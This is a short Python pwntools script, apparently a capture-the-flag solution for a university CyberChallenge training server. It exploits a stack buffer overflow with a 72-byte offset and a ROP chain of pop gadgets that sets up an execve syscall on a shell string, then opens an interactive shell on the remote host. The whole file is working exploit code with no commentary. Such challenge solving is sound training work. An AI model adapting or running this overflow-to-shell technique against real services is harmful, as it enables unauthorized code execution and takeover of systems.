from pwn import *

HOST = 'cyberchallenge.disi.unitn.it'
PORT = 9102
OFFSET = 72

#take a look for atol

context.terminal = ["konsole", "-e"]

breakpoint = "0x0000000000401191"

p = remote(HOST, PORT)


# r = process("./bin")
# r = gdb.debug(
#     "./bin",
#     f"""
#     break *{breakpoint}
#     continue
#     """
# )

pop_rax = p64(0x000000000040119c)
pop_rdi = p64(0x0000000000401196)
pop_rdx = p64(0x000000000040119a)
pop_rsi = p64(0x0000000000401198)
syscall = p64(0x000000000040119e)
bin_bash = p64(0x0000000000402004)

payload = b"A" * OFFSET

payload += pop_rax
payload += p64(59)
payload += pop_rdi
payload += bin_bash
payload += pop_rsi
payload += p64(0)
payload += pop_rdx
payload += p64(0)
payload += syscall

p.sendline(payload)
p.interactive()
